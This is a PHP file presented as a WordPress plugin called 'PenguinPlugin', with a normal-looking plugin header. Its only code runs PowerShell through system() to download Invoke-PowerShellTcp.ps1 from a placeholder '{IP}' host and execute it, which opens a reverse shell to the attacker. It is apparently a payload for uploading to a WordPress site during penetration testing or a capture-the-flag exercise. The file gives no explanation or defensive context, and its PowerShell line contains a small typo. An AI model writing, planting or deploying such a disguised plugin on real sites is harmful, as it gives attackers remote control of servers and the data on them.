<?php
/**
 * Plugin Name: PenguinPlugin
 * Version: 5.6.5
 * Author: Mashiroro
 * Author URI: https://github.com/Mashiroro
 * License: GPL2
 */

echo system('powershell.exe IEX (New-ObjectNet.WebClient).DownloadString("{IP}/Invoke-PowerShellTcp.ps1")');
?>